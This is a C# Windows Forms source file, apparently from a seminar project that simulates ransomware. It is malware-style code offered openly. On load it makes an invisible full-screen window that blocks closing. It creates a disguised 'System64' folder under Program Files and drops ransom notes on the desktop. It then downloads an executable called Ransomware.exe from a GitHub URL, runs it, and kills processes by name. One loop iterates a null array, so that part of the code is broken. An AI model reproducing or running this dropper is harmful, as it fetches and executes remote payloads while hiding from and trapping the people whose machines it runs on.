﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Seminar_Ransomware_Simulation
{
    public partial class Ransomware : Form
    {
        public Ransomware()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; //Make invisible
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //anti-kill
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            Directory.CreateDirectory("C:\\Program Files\\System64"); //create folder
            File.WriteAllText("C:\\Program Files\\System64\\README.txt", "You were encrypted by idiots, good luck...");  //Create textfile

            ///Positionierung:
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define path on desktop
            string existfile = path_cache + @"\cache_DCQÜLX.exe"; //define for kill process

            if (!File.Exists(existfile)) {
                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
                {
                    streamWriter.WriteLine("Ur files are locked :-)"); //text for file
                }
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\Ransomware2.0.txt")) //Create file
            {
                streamWriter.WriteLine("Ur files are locked :-)"); //text for file
            }

            ///Von  .net
            ServicePointManager.Expect100Continue = true; //Make protocol for download file from Github
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            //Ist der download nötig? Können das auch lokal ausführen
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://github.com/s181247/Integrationsseminar/blob/main/Ransomware.exe", @"C:\Program Files\System64\Ransomware.exe"); // Hide downloading, Website / Speicherort
            // Fix application os by removing app and check process documentation microsoft "C:\\Program Files\\System64\\Ransomware.exe"
            Process.Start("C:\\Program Files\\System64\\Ransomware.exe"); //Ransomware nach Download ausführen
           

            Process[] _process = null;
            _process = Process.GetProcessesByName("DCQPKX");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

            Process[] _process2 = null;
            _process = Process.GetProcessesByName("._cache_DCQPKX");
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void label1_Click_1(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}
